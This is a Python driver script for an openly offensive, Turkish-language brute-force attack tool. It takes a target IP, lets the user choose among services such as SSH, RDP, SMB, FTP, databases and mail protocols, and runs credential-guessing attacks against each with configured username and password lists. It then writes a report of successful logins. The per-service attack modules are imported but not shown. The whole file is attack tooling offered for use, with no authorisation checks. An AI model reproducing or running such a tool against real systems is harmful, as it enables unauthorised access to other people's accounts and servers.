from services.ftp import FTPBruteForce
from services.ssh import SSHBruteForce
from services.http import HTTPBruteForce
from services.https import HTTPSBruteForce
from services.mysql import MySQLBruteForce
from services.postgres import PostgreSQLBruteForce
from services.smtp import SMTPBruteForce
from services.pop3 import POP3BruteForce
from services.imap import IMAPBruteForce
from utils.raporlayici import Raporlayici
from services.rdp import RDPBruteForce
from services.smb import SMBBruteForce
from services.telnet import TelnetBruteForce
from services.vnc import VNCBruteForce
from services.mssql import MSSQLBruteForce
from config import Ayarlar
import os
import socket

def giris_ekrani():
    print("=" * 60)
    print("BRUTE-FORCE SALDIRI ARACI".center(60))
    print("=" * 60)

def geçerli_ip_girisi(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def hedef_ip_al():
    while True:
        ip = input("Hedef IP adresini girin: ").strip()
        if geçerli_ip_girisi(ip):
            return ip
        print("[!] Geçersiz IP formatı! Örnek: 192.168.1.1")

def servis_secimi():
    print("\nKullanılabilir Servisler:")
    for i, (servis, port) in enumerate(Ayarlar.PORTLAR.items(), 1):
        print(f"{i}. {servis.upper()} (Port {port})")
    
    secim = input("\nTüm servisler için [A], seçim için [S] girin: ").upper()
    if secim == 'A':
        return None  # Tüm servisler
    elif secim == 'S':
        try:
            num = int(input("Servis numarası girin: "))
            servis = list(Ayarlar.PORTLAR.keys())[num-1]
            return [servis]
        except (ValueError, IndexError):
            print("[!] Geçersiz seçim, tüm servisler kullanılacak")
            return None
    else:
        print("[!] Geçersiz seçim, tüm servisler kullanılacak")
        return None

def main():
    # Dizinleri oluştur
    for dir in ["wordlists", "reports", "sonuclar"]:
        os.makedirs(dir, exist_ok=True)
    
    giris_ekrani()
    hedef_ip = hedef_ip_al()
    secilen_servisler = servis_secimi()
    
    raporlayici = Raporlayici()
    servisler = []
    
    # Servisleri oluştur
    for servis_adi, port in Ayarlar.PORTLAR.items():
        if secilen_servisler is None or servis_adi in secilen_servisler:
            servis_sinifi = globals()[f"{servis_adi.upper()}BruteForce"]
            servisler.append(servis_sinifi(hedef_ip, port))

    # Saldırıları başlat
    for servis in servisler:
        print(f"\n[+] {servis.servis_adi} servisi taranıyor ({hedef_ip}:{servis.hedef_port})...")
        try:
            sonuc = servis.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
            if sonuc:
                print(f"[+] {servis.servis_adi} için başarılı giriş bulundu!")
            else:
                print(f"[-] {servis.servis_adi} için başarılı giriş bulunamadı.")
        except Exception as e:
            print(f"[!] Hata: {str(e)}")
            continue

    # Rapor
    raporlayici.rapor_yazdir()
    raporlayici.raporu_dosyaya_kaydet(Ayarlar.RAPOR_DOSYASI)
    print(f"\n[+] Rapor kaydedildi: {Ayarlar.RAPOR_DOSYASI}")

if __name__ == "__main__":
    main()